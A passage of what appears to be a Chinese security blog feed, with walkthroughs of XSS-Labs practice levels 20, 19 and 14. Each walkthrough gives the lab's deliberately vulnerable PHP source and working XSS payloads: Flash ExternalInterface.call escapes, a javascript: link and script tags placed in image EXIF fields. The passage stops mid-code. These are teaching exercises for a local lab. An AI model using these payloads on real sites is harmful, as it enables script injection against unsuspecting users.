        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页或访问该页面中的内容之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。</p><p>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>IE/Chrome</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level20/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>flash xss，需要对flash的反编译对源码进行分析，这里使用<a href="https://github.com/jindrapetrik/jpexs-decompiler" target="_blank" rel="noopener">jpexs-decompiler</a>来分析，首先定位<code>ExternalInterface.call</code>函数，发现<code>ExternalInterface.call</code>函数的第二个参数没有进行过滤可能导致XSS。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level20/查找可以函数.png" alt="查找可以函数"></center></li><li><p>构造如下所示payload，操作结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level20<span class="token punctuation">.</span>php<span class="token operator">?</span>arg01<span class="token operator">=</span>id<span class="token operator">&amp;</span>arg02<span class="token operator">=</span>xss\"<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//%26width=123%26height=123</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level20<span class="token punctuation">.</span>php<span class="token operator">?</span>arg01<span class="token operator">=</span>id<span class="token operator">&amp;</span>arg02<span class="token operator">=</span>\<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>self<span class="token punctuation">.</span>a<span class="token punctuation">)</span>self<span class="token punctuation">.</span>a<span class="token operator">=</span><span class="token operator">!</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//%26width%26height</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level20/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level21.php?arg01=a&amp;arg02=b"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level20<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level20<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;embed src="xsf04.swf?'</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"arg01"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"="</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"arg02"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'" width=100% heigth=100%>'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由17行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后复制给<code>embed</code>标签的<code>src</code>值。</li></ul></li><li><p>所以含有的预定义字符的注入无效，但不含预定义字符构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序对参数过滤后回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript">xss\"<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/xss/</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//%26width=123%26height=123</span>\<span class="token operator">%</span><span class="token number">22</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>self<span class="token punctuation">.</span>a<span class="token punctuation">)</span>self<span class="token punctuation">.</span>a<span class="token operator">=</span><span class="token operator">!</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">//%26width%26height</span><span class="token operator">...</span></code></pre></li><li><p><strong>flash xss</strong>：因为flash有可以调用<code>js</code>的函数，也就是可以和<code>js</code>进行通信。因此这些函数如果使用不当也是会造成xss的。常见的可触发xss的危险函数有：<code>getURL</code>、<code>navigateToURL</code>、<code>ExternalInterface.call</code>、<code>htmlText</code>、<code>loadMovie</code>等等。</p></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><p><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></p></li><li><p><a href="https://www.zhaosimeng.cn/writeup/119.html" target="_blank" rel="noopener">xss-labs靶场通关</a></p></li><li><p><a href="https://www.jianshu.com/p/4e3a517bc4ea" target="_blank" rel="noopener">XSS挑战之旅-游戏闯关</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level19</title>
      <link href="/2020/10/31/xss-zhi-xss-labs-level19/"/>
      <url>/2020/10/31/xss-zhi-xss-labs-level19/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页或访问该页面中的内容之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。</p><p>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>IE</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level19/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>flash xss，需要对flash的反编译对源码进行分析，这里使用<a href="https://github.com/jindrapetrik/jpexs-decompiler" target="_blank" rel="noopener">jpexs-decompiler</a>来分析，首先定位getURL函数。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level19/定位getURL函数位置.png" alt="定位getURL函数位置"></center></li><li><p>然后追踪<code>sIFR</code>的内容</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level19/追踪sIFR内容.png" alt="追踪sIFR内容"></center><p>得知<code>version</code>参数可以传入<code>loc4</code>变量中，即<code>sIFR</code>的内容中，但是<code>getURL</code>只在内容为<code>link</code>时打开，所以分析<code>contentIsLink</code>函数。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level19/contentIsLink函数.png" alt="contentIsLink函数"></center></li><li><p>所以我们可以构造<code>&lt;a &gt;</code>标签来传值，操作结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level19<span class="token punctuation">.</span>php<span class="token operator">?</span>arg01<span class="token operator">=</span>version<span class="token operator">&amp;</span>arg02<span class="token operator">=</span><span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:alert(1)"</span><span class="token operator">></span><span class="token number">123</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level19/注入成功.png" alt="注入成功"></center></li></ol><ol start="4"><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level20.php?arg01=a&amp;arg02=b"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level19<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level19<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">'&lt;embed src="xsf03.swf?'</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"arg01"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"="</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"arg02"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'" width=100% heigth=100%>'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由17行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后复制给<code>embed</code>标签的<code>src</code>值。</li></ul></li><li><p>所以含有的预定义字符的注入无效，但不含预定义字符构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序对参数过滤后回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript"># 伪协议<span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string">"javascript:alert(1)"</span><span class="token operator">></span><span class="token number">123</span><span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">></span><span class="token operator">...</span></code></pre></li><li><p><strong>flash xss</strong>：因为flash有可以调用<code>js</code>的函数，也就是可以和<code>js</code>进行通信。因此这些函数如果使用不当也是会造成xss的。常见的可触发xss的危险函数有：<code>getURL</code>、<code>navigateToURL</code>、<code>ExternalInterface.call</code>、<code>htmlText</code>、<code>loadMovie</code>等等。</p></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><p><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></p></li><li><p><a href="https://www.zhaosimeng.cn/writeup/119.html" target="_blank" rel="noopener">xss-labs靶场通关</a></p></li><li><p><a href="https://www.jianshu.com/p/4e3a517bc4ea" target="_blank" rel="noopener">XSS挑战之旅-游戏闯关</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level14</title>
      <link href="/2020/10/31/xss-zhi-xss-labs-level14/"/>
      <url>/2020/10/31/xss-zhi-xss-labs-level14/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页或请求该网页中的内容之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。</p><p>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level14/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>提交一个测试图片，查看操作显示结果。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level14/提交测试图片.png" alt="提交测试图片"></center></li></ol><ol start="2"><li><p>在图片<strong>属性</strong>的<strong>详细信息</strong>中设置其主题值为：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level14/在图片属性中写入payload.png" alt="在图片属性中写入payload"></center></li><li><p>重新上传含有payload的图片，操作结果如下图所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level14/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level14<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level14<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token markup">&lt;!--<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>leftframe<span class="token punctuation">"</span></span> <span class="token attr-name">marginwidth</span><span class="token attr-value"><span class="token punctuation">=</span>10</span> <span class="token attr-name">marginheight</span><span class="token attr-value"><span class="token punctuation">=</span>10</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://www.exifviewer.org/<span class="token punctuation">"</span></span> <span class="token attr-name">frameborder</span><span class="token attr-value"><span class="token punctuation">=</span>no</span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>80%<span class="token punctuation">"</span></span> <span class="token attr-name">scrolling</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>no<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span>80%</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token operator">--</span><span class="token operator">></span>    <span class="token delimiter">&lt;?php</span>   <span class="token keyword">echo</span> "<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>level14.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>POST</span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span>multipart/form-data</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span>file</span><span class="token punctuation">></span></span></span>文件名：<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>file</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>file</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span>file</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>提交</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>"<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 允许上传的图片后缀</span><span class="token variable">$allowedExts</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"gif"</span><span class="token punctuation">,</span> <span class="token string">"jpeg"</span><span class="token punctuation">,</span> <span class="token string">"jpg"</span><span class="token punctuation">,</span> <span class="token string">"png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$temp</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"size"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">end</span><span class="token punctuation">(</span><span class="token variable">$temp</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">// 获取文件后缀名</span><span class="token 